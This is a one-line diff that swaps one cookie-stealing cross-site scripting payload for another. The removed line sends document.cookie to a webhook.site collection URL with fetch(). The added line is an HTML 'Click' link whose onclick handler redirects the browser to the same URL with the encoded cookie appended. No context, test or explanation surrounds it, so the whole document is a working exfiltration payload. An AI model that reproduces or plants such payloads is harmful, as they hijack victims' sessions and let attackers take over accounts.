@@ -1,1 +1,1 @@
-fetch('https://webhook.site/f7a6cfea-5f3f-4ae3-a158-77f0cb809474?cookie=' + document.cookie)
+<a href="#" onclick="window.location.href='https://webhook.site/f7a6cfea-5f3f-4ae3-a158-77f0cb809474?cookie=' + encodeURIComponent(document.cookie); return false;">Click</a>
